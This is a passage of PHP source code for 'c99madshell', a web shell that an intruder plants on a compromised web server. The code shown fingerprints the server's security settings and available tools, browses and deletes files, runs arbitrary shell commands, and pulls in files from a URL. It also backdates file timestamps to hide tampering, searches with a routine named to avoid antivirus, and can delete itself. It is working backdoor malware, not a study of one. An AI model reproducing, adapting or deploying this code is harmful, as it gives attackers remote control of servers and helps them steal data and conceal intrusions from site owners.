if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = TRUE;
 $hsafemode = "<font color=red>ON (secure)</font>";
}
else {$safemode = FALSE; $hsafemode = "<font color=green>OFF (not secure)</font>";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";}
else {$openbasedir = FALSE; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}
$sort = @htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),'',getenv("SERVER_SOFTWARE"));
@ini_set("highlight.bg",$highlight_bg); //FFFFFF
@ini_set("highlight.comment",$highlight_comment); //#FF8000
@ini_set("highlight.default",$highlight_default); //#0000BB
@ini_set("highlight.html",$highlight_html); //#000000
@ini_set("highlight.keyword",$highlight_keyword); //#007700
@ini_set("highlight.string",$highlight_string); //#DD0000
if (!isset($actbox) || !is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - c99madshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><form name='todo' method='POST'><input name='act' type='hidden' value=''><input name='grep' type='hidden' value=''><input name='fullhexdump' type='hidden' value=''><input name='base64' type='hidden' value=''><input name='nixpasswd' type='hidden' value=''><input name='pid' type='hidden' value=''><input name='c' type='hidden' value=''><input name='white' type='hidden' value=''><input name='wp_act' type='hidden' value=''><input name='wp_path' type='hidden' value='<?php if(isset($wp_path)) echo($wp_path);?>'><input name='sig' type='hidden' value=''><input name='processes_sort' type='hidden' value=''><input name='d' type='hidden' value=''><input name='sort' type='hidden' value=''><input name='f' type='hidden' value=''><input name='ft' type='hidden' value=''></form><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C99madShell v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr>
<tr><td>
<p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p>
<p align="left"><b>System:&nbsp;<?php echo substr(php_uname(),0,90); ?></b>&nbsp;</p>
<?php 
if(!$win && function_exists('posix_getgrgid') && function_exists('posix_getegid')) {
	echo('<p align="left"><b>User/Group:&nbsp;');
	$groupinfo = posix_getgrgid(posix_getegid());
	echo(get_current_user().'/'.$groupinfo['name']); 
	echo('</b>&nbsp;</p>');
}
?>
<p align="left"><b>Php version: <a href="#" onclick="document.todo.act.value='phpinfo';document.todo.submit();"><b><u><?php echo(phpversion()) ?></u></b></a>
<p align="left"><b>Php modules:&nbsp;
<?php
$cur_ext = get_loaded_extensions();
echo('<font title="'.implode(',', $cur_ext).'">');
$intersect = array_intersect($allow_ext, $cur_ext);
echo(implode(', ', $intersect));
?>
</font></b>&nbsp;</p>
<?php
if($disablefunc) {
	echo('<p align="left" style="color:red"><b>Disable functions:&nbsp;'.implode(', ', $disablefunc).'</b></p>');
}

if (@function_exists('apache_get_modules') && @in_array('mod_security',apache_get_modules())) {
	echo('<p align="left" style="color:red"><b>Mod Security:&nbsp;YES</b></p>');
}
if(!$win && $safemode === FALSE) {
	$pro = array();
	$ser = array();
	foreach($allow_program as $program) {
		if($locate = which($program)) {
			$pro[] = '<font title="'.$locate.'">'.$program.'</font>';
		}
	}
	foreach($allow_service as $service) {
		if($locate = which($service)) {
			$ser[] = '<font title="'.$locate.'">'.$service.'</font>';
		}
	}
	if($pro) {
		echo('<p align="left"><b>Install program:&nbsp;<font color="#00CCFF">'.implode(', ', $pro).'</font></b></p>');

	}
	if($ser) {
		echo('<p align="left"><b>Install service:&nbsp;'.implode(', ', $ser).'</b></p>');
	}
}
?>
<p align="left"><b>Allow_url_fopen:&nbsp;<?php echo((@ini_get('allow_url_fopen'))==1?'<font color="green">ON</font>':'<font color="red">OFF</font>'); ?></b></p>
<p align="left"><b>Allow_url_include:&nbsp;<?php echo((@ini_get('allow_url_include'))==1?'<font color="green">ON</font>':'<font color="red">OFF</font>'); ?></b></p>
<p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p>
<?php
function found_script() {
	$path = @getcwd().'/';
	$path = str_replace('\\', '/', $path);
	if($path === false) {
		return false;
	}
	if(valid_script_path($path)) {
		return $path;
	}
	if(valid_script_path($path.'../')) {
		return $path.'../';
	}
	if(preg_match('%(mod|course|admin|auth|blocks|calendar|error|enrol|files|filter|grade|group|lang|iplookup|login|message|mnet|notes|question|rss|search|tag|theme|user|userpix)%i', $path, $ret)) {
		$path = substr($path, 0, strpos($path, $ret[0]));
		return $path;
	}
	return false;
}

function valid_script_path($path) {
	if($path === false) {
		return false;
	}
	if(file_exists($path.'config.php')) {
		return true;
	} else {
		return false;
	}
}
?>
<p align="left"><?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = @realpath(".");} elseif(@realpath($d)) {$d = @realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($t)."';document.todo.sort.value='".$sort."';document.todo.submit();\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (@is_writable($d))
{
 $wd = TRUE;
 $wdt = "<font color=green>[ ok ]</font>";
 echo "<b><font color=green>".view_perms(@fileperms($d))."</font></b>";
}
else
{
 $wd = FALSE;
 $wdt = "<font color=red>[ Read-Only ]</font>";
 echo "<b>".view_perms_color($d)."</b>";
}
if (is_callable("disk_free_space"))
{
 $free = @disk_free_space($d);
 $total = @disk_total_space($d);
 if ($free === FALSE) {$free = 0;}
 if ($total === FALSE) {$total = 0;}
 if ($free < 0) {$free = 0;}
 if ($total < 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";
}

echo "<br>";
$letters = "";
if ($win)
{
 $v = explode("\\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
  $bool = $isdiskette = in_array($letter,$safemode_diskettes);
  if (!$bool) {$bool = @is_dir($letter.":\\");}
  if ($bool)
  {
   $letters .= "<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($letter.":\\")."';document.todo.submit();\">[ ";
   if (strtolower($letter.':') != strtolower($v)) {$letters .= $letter;}
   else {$letters .= "<font color=\"#00FF66\">".$letter."</font>";}
   $letters .= " ]</a> ";
  }
 }
 if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";}
}
if (count($quicklaunch) > 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%sort",$sort,$item[1]);
  $v = @realpath($d."..");
  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
  $item[1] = str_replace("%upd",urlencode($v),$item[1]);

  echo "<a href=\"".$item[1]."\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
echo "</p></td></tr></table><br>";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";
if ($act == "") {$act = $dspact = "ls";}
if ($act == "mkdir")
{
 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}
  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
  echo "<br><br>";
 }
 $act = $dspact = "ls";
}

if ($act == "d")
{
 if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}
 else
 {
  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
  if (!$win)
  {
   echo "<tr><td><b>Owner/Group</b></td><td> ";
   $ow = posix_getpwuid(fileowner($d));
   $gr = posix_getgrgid(filegroup($d));
   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
  }
  echo "<tr><td><b>Perms</b></td><td><a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
 }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}

if ($act == "selfremove")
{
 if (($submit == $rndcode) and ($submit != ""))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99madshell v.".$shver."!"; c99shexit(); }
  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
 }
 else
 {
  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";}
  $rnd = rand(0,9).rand(0,9).rand(0,9);
  echo "<form method=\"POST\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";
 }
}

if($act == 'touch') {
	if(is_link($d.$f) || $f == '.' || $f == '..') {
		echo('<font color="red">ONLY FILE AND CATALOGS!!!</font>');
		$act = 'ls';
	} else {
		if(!isset($submit)) {
			$time_array = explode(':',@date("d:m:Y:H:i:s",@filemtime($d.$f)));
		echo("
		<form method=\"POST\">
		<input name='act' type='hidden' value='touch'>
		<input name='f' type='hidden' value='".urlencode($f)."'>
		<input name='d' type='hidden' value='".urlencode($d)."'>
		<input type=submit name=submit value=\"Save\">&nbsp;
		<input type=\"reset\" value=\"Reset\">&nbsp;
		<input type=\"button\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".addslashes(substr($d,0,-1))."';document.todo.submit();\" value=\"Back\"><br>Current file's time: ".@date("d.m.Y H:i:s", filemtime($d.$f)).'
<br />Set new date:
<select name="day" size="1">');
echo($time_array[0]);
for($i=1;$i<32;++$i) {
	$i2 = (strlen($i)==1)?'0'.$i:$i;
	echo('<option value="'.$i2.'" '.(($time_array[0]==$i2)?' selected':'').'>'.$i2.'</option>');
}
echo('</select>
&nbsp;<b>Month</b>
<select name="month" size="1">
<option value="January" '.(($time_array[1]=='01')?'selected':'').'>January ---(01)</option>
<option value="February" '.(($time_array[1]=='02')?'selected':'').'>February --(02)</option>
<option value="March" '.(($time_array[1]=='03')?'selected':'').'>March ------(03)</option>
<option value="April" '.(($time_array[1]=='04')?'selected':'').'>April --------(04)</option>
<option value="May" '.(($time_array[1]=='05')?'selected':'').'>May ---------(05)</option>
<option value="June" '.(($time_array[1]=='06')?'selected':'').'>June --------(06)</option>
<option value="July" '.(($time_array[1]=='07')?'selected':'').'>July ---------(07)</option>
<option value="August" '.(($time_array[1]=='08')?'selected':'').'>August -----(08)</option>
<option value="September" '.(($time_array[1]=='09')?'selected':'').'>September -(09)</option>
<option value="October" '.(($time_array[1]=='10')?'selected':'').'>October ----(10)</option>
<option value="November" '.(($time_array[1]=='11')?'selected':'').'>November --(11)</option>
<option value="December" '.(($time_array[1]=='12')?'selected':'').'>December --(12)</option>
</select>

&nbsp;<b>Year</b>
<select name="year" size="1">');
echo($time_array[0]);
for($i=1998;$i<2010;++$i) {
	echo('<option value="'.$i.'" '.(($time_array[2]==$i)?' selected':'').'>'.$i.'</option>');
}
echo('</select>

&nbsp;<b>Hour </b>
<select name="chasi" size="1">');
echo($time_array[0]);
for($i=1;$i<60;++$i) {
	$i2 = (strlen($i)==1)?'0'.$i:$i;
	echo('<option value="'.$i2.'" '.(($time_array[3]==$i2)?' selected':'').'>'.$i2.'</option>');
}
echo('</select>

&nbsp;<b>Minute </b>
<select name="minutes" size="1">');
echo($time_array[0]);
for($i=1;$i<60;++$i) {
	$i2 = (strlen($i)==1)?'0'.$i:$i;
	echo('<option value="'.$i2.'" '.(($time_array[4]==$i2)?' selected':'').'>'.$i2.'</option>');
}
echo('</select>

&nbsp;<b>Second </b>
<select name="second" size="1">');
echo($time_array[0]);
for($i=1;$i<60;++$i) {
	$i2 = (strlen($i)==1)?'0'.$i:$i;
	echo('<option value="'.$i2.'" '.(($time_array[5]==$i2)?' selected':'').'>'.$i2.'</option>');
}
echo('</select></form>');
$act = 'ls';
		} else {
	$datar = $_POST['day']." ".$_POST['month']." ".$_POST['year']." ".$_POST['chasi']." hours ".$_POST['minutes']." minutes ".$_POST['second']." seconds";
	$datar = @strtotime($datar);
	if(@touch($d.$f,$datar,$datar)) {
		echo('<center><b><font color=green>Time was been change successfull</font></b></center>');
	} else {
		echo('<center><b><font color=red>Time NOT changed!!!</font></b></center>');
	}
	$act = 'ls';
}
	}
}

if ($act == "search")
{
 echo "<b>Search in file-system:</b><br>";
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}
 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $search_i_f = 0;
  $search_i_d = 0;
  $a = array
  (
   "name"=>@$search_name, "name_regexp"=>@$search_name_regexp,
   "text"=>@$search_text, "text_regexp"=>@$search_text_regxp,
   "text_wwo"=>@$search_text_wwo,
   "text_cs"=>@$search_text_cs,
   "text_not"=>@$search_text_not
  );
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v) {no_antivir_search($v);}
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = TRUE;
   $act = "ls";
  }
 }
 echo "<form method=POST>
<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">
<b>Search for (file/folder name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp
<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".@htmlspecialchars($search_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".(@$search_text_regexp == 1?" checked":"")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".(@$search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".(@$search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".(@$search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text
<br><br><input type=submit name=submit value=\"Search\"></form>";
}
if ($act == "about") {echo "Modified by k1b0rg. Nahui ibo pohui, eslib nehui.";}
if ($act == "chmod")
{
 $mode = fileperms($d.$f);
 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
 else
 {
  $form = TRUE;
  if (isset($chmod_submit))
  {
	if(empty($hand)) {
	$octet = '0'.base_convert((isset($chmod_o["r"])?1:0).(isset($chmod_o["w"])?1:0).(isset($chmod_o["x"])?1:0).(isset($chmod_g["r"])?1:0).(isset($chmod_g["w"])?1:0).(isset($chmod_g["x"])?1:0).(isset($chmod_w["r"])?1:0).(isset($chmod_w["w"])?1:0).(isset($chmod_w["x"])?1:0),2,8);
	} else {
		if(substr($hand,0,1)==0) { $octet = $hand; } else {$octet = '0'.$hand; }

	}
	if(!isset($recurs)) $recurs = 0;
	if(is_dir($d.$f) && $recurs== 1) {
		$result = setRecursPerm($d.$f,intval($octet,8));
		list($good, $bad) = explode(':', $result);
		echo('<b>Result: <font color="green">'.$good.'=> Success</font>, <font color="red">'.$bad.'=>BAD</font><b><br>');
	} else {
		if (@chmod($d.$f,intval($octet,8))) {
			clearstatcache();
			$act = 'ls';
			$form = FALSE;
			$err = '';
		} else {
			$err = 'Can\'t chmod to '.$octet.'.';
		}
	}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".(isset($err)?"<b>Error:</b> ".$err:"")."<form  method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=text name=hand value=\"\"><br />";
   if(is_dir($d.$f)) {
	echo "<input type=checkbox NAME=recurs value=1 checked=\"checked\"> Use recursive<br>";
   }
   echo "<br><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
 }
}
if ($act == "upload") {
	$uploadmess = '';

	if(isset($_FILES['uploadfile']) && !empty($_FILES['uploadfile']['tmp_name'])) {
		$uploadpath = $d;
		$destin = $_FILES['uploadfile']["name"];
		if (!move_uploaded_file($_FILES['uploadfile']['tmp_name'],$uploadpath.$destin)) {$uploadmess .= "<font color=red>Error uploading file ".$_FILES['uploadfile']['name']." (can't copy \"".$_FILES['uploadfile']['tmp_name']."\" to \"".$uploadpath.$destin."\"!</font><br>";} else {
			$uploadmess = '<font color=green>File success uploaded</font>';
		}
	} elseif (!empty($_POST['uploadurlfile'])) {
		$uploadpath = $d;
		$url = $_POST['uploadurlfile'];
		$filename = basename($url);
		$luck = false;
		$errors = array();
		foreach ($upload_functions as $func) {
			if (true === ($return = $func($url, $uploadpath.$filename))) {
				$luck = true;
				$uploadmess  = '['.$func.'] => upload success';
				break;
			} else {
				$errors[] = '['.$func.'] => '.$return;
			}
		}
		if (!$luck) {
			$uploadmess = 'file upload error: ';
			$uploadmess .= implode('<br>', $errors);
		}
	}
	echo "<center><b>".$uploadmess."</b></center>";
	$act = 'ls';
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = FALSE;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
 }
 if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
 $act = "ls";
}

if ($act == 'unpack') {

	if (!isset($arc_path) || !is_dir($arc_path) || !isset($arc)) {
		echo('invalid data');
		$act = "ls";
	} else {
		$arc_file    = $arc;
		$unpack_path = $arc_path;
		if (false === ($type = is_archive($arc_file))) {
			echo($arc_file.' is not valid archieve file!');
			$act = "ls";
		} else {
			if (isset($system_unpack) && $system_unpack == 1 && !$win && !$safemode) {
				switch ($type) {
					case 'tar': $cmd = 'tar -xf '.$arc_file.' -C '.$unpack_path; break;
					case 'tgz': 
					case 'tar.gz': 
					case 'tar.gzip': 
						$cmd = 'tar -xzf '.$arc_file.' -C '.$unpack_path; break;
					case 'tbz': 
					case 'tb2': 
					case 'tbz2': 
					case 'tar.bzip2': 
					case 'tar.bz2': 
						$cmd = 'tar -xyf '.$arc_file.' -C '.$unpack_path; break;
					case 'zip': $cmd = 'unzip '.$arc_file.' -d '.$unpack_path; break;
					default: echo('not support type of archive'); break;
				}
				$d = $unpack_path;
				myshellexec($cmd);
				echo('success unpacking');
				$act = "ls";
			} else {
				$d = $unpack_path;
				if ($type == 'zip') {
					$zip = new PclZip($arc_file);
					if ($zip->extract($unpack_path)) {
						echo('<font color="green"><center>Success extracted</center></font>');
						$act = 'ls';
					} else {
						echo('<font color="red">NOT EXTRACT => ['.$zip->errorName().'] ('.$zip->errorInfo(true).')</font>');
						$act = 'ls';
					}
				} elseif (in_array($type, array('tar', 'tgz', 'tar.gz', 'tar.gzip', 'tbz', 'tb2', 'tbz2', 'tar.bzip2', 'tar.bz2'))) {
					if ($type == 'tar') {
						$tar = new Tar($arc_file);
					} else {
						$tar = new Tar($arc_file, $type);
					}
					if ($tar->extract($unpack_path)) {
						echo('<font color="green"><center>Success extracted</center></font>');
						$act = 'ls';
					} else {
						echo('<font color="red">NOT EXTRACT => ['.$tar->getError().']</font>');
						$act = 'ls';
					}
				} else {
					echo('<font color="red">Unknown type of archive</font>');
					$act = 'ls';
				}
			}
		}
	}
}

if ($act == "cmd")
{
 @chdir($chdir);
 if (!empty($submit))
 {
  echo "<b>Result of execution this command</b>:<br>";
  $olddir = realpath(".");
  @chdir($d);
  $ret = myshellexec($cmd);
  $ret = convert_cyr_string($ret,"d","w");
  if ($cmd_txt)
  {
   $rows = count(explode("\r\n",$ret))+1;
   if ($rows < 10) {$rows = 10;}
   echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
  }
  else {echo $ret."<br>";}
  @chdir($olddir);
 }
 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".@htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while (($o = readdir($h)) !== FALSE) { 
		if (is_file($d.$o) && is_archive($d.$o)) {
			$ac_count++;
			$last_arc = $d.$o;
		}
		$list[] = $d.$o;
	}
	closedir($h);
  }
  else {}
 }
 if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
 else
 {
  //Building array
  $objects = array();
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $objects["head"] = array();
   $objects["folders"] = array();
   $objects["links"] = array();
   $objects["files"] = array();
   foreach ($list as $v)
   {
    $o = @basename($v);
    $row = array();
    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
    elseif (is_dir($v))
    {
     if (@is_link($v)) {$type = "LINK";}
     else {$type = "DIR";}
     $row[] = $v;
     $row[] = $type;
    }
    elseif(@is_file($v)) {$row[] = $v; $row[] = @filesize($v);}
    $row[] = @filemtime($v);
    if (!$win)
    {
     $ow = @posix_getpwuid(@fileowner($v));
     $gr = @posix_getgrgid(@filegroup($v));
     $row[] = ($ow["name"]?$ow["name"]:@fileowner($v))."/".($gr["name"]?$gr["name"]:@filegroup($v));
    }
    $row[] = @fileperms($v);
    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
    elseif (@is_link($v)) {$objects["links"][] = $row;}
    elseif (@is_dir($v)) {$objects["folders"][] = $row;}
    elseif (@is_file($v)) {$objects["files"][] = $row;}
    $i++;
   }
   $row = array();
   $row[] = "<b>Name</b>";
   $row[] = "<b>Size</b>";
   $row[] = "<b>Modify</b>";
   if (!$win)
  {$row[] = "<b>Owner/Group</b>";}
   $row[] = "<b>Perms</b>";
   $row[] = "<b>Action</b>";
   $parsesort = parsesort($sort);
   $sort = $parsesort[0].$parsesort[1];
   $k = $parsesort[0];
   if ($parsesort[1] != "a") {$parsesort[1] = "d";}
   $y = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$k.($parsesort[1] == "a"?"d":"a").";document.todo.submit();\">";
   $row[$k] .= $y;
   for($i=0;$i<count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "<a href=\"#\" onclick=\"document.todo.act.value='".$dspact."';document.todo.d.value='".urlencode($d)."';document.todo.sort.value='".$i.$parsesort[1]."';document.todo.submit();\">".$row[$i]."</a>";}
   }
   $v = $parsesort[0];
   usort($objects["folders"], "tabsort");
